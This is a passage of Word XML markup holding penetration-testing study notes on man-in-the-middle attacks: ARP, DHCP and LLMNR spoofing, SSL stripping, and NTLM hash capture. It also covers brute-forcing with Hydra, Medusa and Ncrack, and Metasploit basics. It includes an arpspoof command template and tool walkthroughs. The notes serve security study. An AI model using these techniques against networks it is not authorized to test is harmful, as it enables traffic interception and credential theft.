    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000264">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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Capture traffic between host and destination</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000265">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="109"/>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Capture traffic to specific port</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000026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Output with -w (exported data with tcpdump -r)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000026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6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Good for grep and command line operations</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000026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6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Windump on windows</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000026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6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vdf9wb95k79t" w:id="100"/>
        <w:bookmarkEnd w:id="10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Man in the middle (MITM) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000026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Common in local area networks (low security in Layer 2-3 protocols)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000026E">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rldu9it6y2k3" w:id="101"/>
        <w:bookmarkEnd w:id="10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Poisoning </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000026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Send gratuitous reply as A to B, as well as B to A.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000027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30 second intervals of before the TTL in the ARP Cache Timeout</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000027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jabriqo8yxz" w:id="102"/>
        <w:bookmarkEnd w:id="10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Local To Remote</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000027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Hosts use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default gateway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send packets to hosts outside the LAN</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000027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Advertise self as gateway via gratuitous arp replies</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000027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4x2cd7asa0o" w:id="103"/>
        <w:bookmarkEnd w:id="10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DHCP Spoofing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000027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DHCP → run to dynamically assign or revoke IP addresses to hosts on a network (UDP, messages sent in broadcasT)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000276">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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 joins network:DHCP Discovery broadcast (UDP 67), 0.0.0.0 ip</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000277">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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DHCP server in the same broadcast domain responds with DHCP offer (IP assigned, DST IP, Lease Time)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000278">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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Client responds with DHCP REQUEST, address broadcast to compare to the multiple OFFERS received </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000279">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>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 Winning DHCP server sends a DHC ACK, with the ip, mac</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002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Since it is broadcast, spoofing is possible</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000027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u3a6nrim7dm" w:id="104"/>
        <w:bookmarkEnd w:id="10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MitM Public Key Exchange</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000027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Affect key exchange,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000027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Intercept requests to a key server for a public key → forward to keyserver → intercept response key → send back attackers public key → intercept data sent out and re encrypt with intercepted real response key</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000027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7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8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8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bet7xycpldy" w:id="105"/>
        <w:bookmarkEnd w:id="10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Link-local Multicast Name Reponse (LLMNR)&amp; NEtBios name service (NBT-NS) SPOOFING</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000028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Capture NTLM or LM hashes (mitm)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000028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LLMNR succeed Netbios nameservice</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000028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Resolve Host names within network if DNS Fails, ie incorrect share goes to DNS fails then to LLMNR or NBT-NS, as a broadcast message. → attacker can respond as the share → login details then sent to fake share</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000028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responder &amp; multirelay</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000028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8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uqrna6rx32i" w:id="106"/>
        <w:bookmarkEnd w:id="10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Attacking Tools</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000288">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r6xhhzbc0gq" w:id="107"/>
        <w:bookmarkEnd w:id="10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Ettercap</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000028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Sniffing for different protocols (POP/https/etc) and password cracking</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000028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 graphical</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000028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Scan for hosts</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000028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8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0l1sdrjbt6" w:id="108"/>
        <w:bookmarkEnd w:id="10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Cain &amp; Abel</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000028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Cain and abel sniffer → configure on interface</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000028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Scan mac address, run ARP Poisoning (Bottom tab APR ??)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000029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using ACTIVE DIR for auth, Cain and abel  can get ntlm hash creds.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000029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hb22g83pnfic" w:id="109"/>
        <w:bookmarkEnd w:id="109"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000029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h6zx4bw38q9" w:id="110"/>
        <w:bookmarkEnd w:id="11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Macof</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000029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Mac Flooding  (can also be done by ettercap and cain and abel)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000029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nfmqg9gl4zon" w:id="111"/>
        <w:bookmarkEnd w:id="11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Arpspoof</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000029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whrwpsujfqp" w:id="112"/>
        <w:bookmarkEnd w:id="11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Bettercap </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000029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Mitm framework</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000029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qfjcyr0xu9f" w:id="113"/>
        <w:bookmarkEnd w:id="11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MitM Video</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000029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Promiscuous mode → nic accept all packets even those not addressed to it</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000029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Need to enable port forwarding to Capture traffic etc:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Table11"/>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29A">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Echo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&gt;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pv4</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/ip_forward</w:t>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:rtl w:val="0"/>
                </w:rPr>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000029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Sending arp replies to each host, mitm both, forward replies</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000029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Arpspoof</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000029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Victim A</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Table12"/>
        <w:jc w:val="left"/>
        <w:tblInd w:w="100.0" w:type="pct"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="0600"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10080"/>
        <w:tblGridChange w:id="0">
          <w:tblGrid>
            <w:gridCol w:w="10080"/>
          </w:tblGrid>
        </w:tblGridChange>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:shd w:fill="333333" w:val="clear"/>
            <w:tcMar>
              <w:top w:w="100.0" w:type="dxa"/>
              <w:left w:w="100.0" w:type="dxa"/>
              <w:bottom w:w="100.0" w:type="dxa"/>
              <w:right w:w="100.0" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000029E">
            <w:pP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Arpspoof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Nic -t Targetadd SPOOFadd</w:t>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:rtl w:val="0"/>
                </w:rPr>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000029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Second command is needed inverted to do the opposite on the second host B</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002A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Wireshark: http.authbasic</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002A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A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Ettercap:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002A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 (graphical) → unified sniffing → interface select → Specify Targets (hosts- scan for hosts) → got to hosts/ view → add to Target 1 and 2 → Mitm → arp poisoning → sniff remote connections</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002A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Bettercap</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002A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r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002A6">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ml19dg68x5q" w:id="114"/>
        <w:bookmarkEnd w:id="11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Intercepting SSL Traffic</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002A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A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Ssl strip for HTTPS, relays https traffic to http traffic, removing parts of requests .</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002A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 be stopped by the HTTP Strict transport Security (HSTS) → stopping the protocol downgrade from https to http, redirect http to https requests.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Browser</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002A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Preloaded lists → sites that must be https</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002A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HSTS can be bypassed → sslstrip+, runs a dns server to intercept and edit DNS data. Modify requests to real dns sites, forward and respond with fake.dodges preloaded lists because domain is wrong (ie. atog instead of ato)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002A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A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A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B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C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C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C2">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otmlne35ci9" w:id="115"/>
        <w:bookmarkEnd w:id="11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Exploitation</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002C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0t2kgjzmy30" w:id="116"/>
        <w:bookmarkEnd w:id="11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NESSUS</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002C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bfirb8rebbf" w:id="117"/>
        <w:bookmarkEnd w:id="11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Low Hanging Fruit</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002C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Misconfigurations</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002C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ACLs</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002C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Weak/Default Passwords</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002C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Open SMB’s Null sessions</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002C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Broadcast requests</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002C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Public Exploits</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002C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CC">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andbmne3b4c" w:id="118"/>
        <w:bookmarkEnd w:id="11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PAsswords → </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002C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Ncrack (network cracking) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002C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Medusa </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002C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patador</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002D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D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zyhj6ouxlue" w:id="119"/>
        <w:bookmarkEnd w:id="11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Generate Wordlists → rsmangler /CeWL/mentalists</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002D2">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12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Takes a wordlist of what you defined and makes a wordlist</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002D3">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="128"/>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CeWL generates and can scrape websites</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002D4">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D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D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D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mz350u9pjtz" w:id="120"/>
        <w:bookmarkEnd w:id="12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Authentication &amp; Brute Forcing VIDEO </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002D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machine -- ftp ssh telnet services</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002D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/usr/share/seclists/</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002D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Ncrack telnet → topshortlist usernames </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002D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Ncrack ssh → -p protocol</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002D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Ncrack ftp → protocol is changed</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002D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Medusa (can parallel hosts, users and attacks) → -h host, -M telnet , -U userlist and passworlist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fails on telnet (can't understand logon)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002D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Medusa ssh → change protocol</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002D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Hydra→ -L users, -P pass, protocol://ip, can modify the task value </w:t>
          <w:br w:type="textWrapping"/>
          <w:t xml:space="preserve">(-T 5)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002E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E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1ywjm9kggnx" w:id="121"/>
        <w:bookmarkEnd w:id="12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Exploitation</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002E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g4724sdxf8f" w:id="122"/>
        <w:bookmarkEnd w:id="12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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002E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service postgresql start</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002E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msfconsole</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002E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Commands</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002E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 → filter, eg: type:exploit, platform:windows, cve:2019</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002E7">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4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Bind, connect to the remote machine, to specific port. Attack establishes connection to this porty</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002E8">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>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Reverse , connects back</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002E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Info → background info on the exploit</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002E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usr/share/metasploit-framework/modules/exploits</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002E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E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Show payloads → for specific exploit is active</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002E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Show targets → specified targets that it can affect</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002E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LHOST → local host, RHOST→ Remote</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002E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F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F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bt50a6jkcn" w:id="123"/>
        <w:bookmarkEnd w:id="12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Authentication Weakness</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002F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F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NTLM - nt lan manager, auth between windows clients and servers, replaced by kerberos in some cases</w:t>
        </w:r>
      </w:ins>
    </w:p>
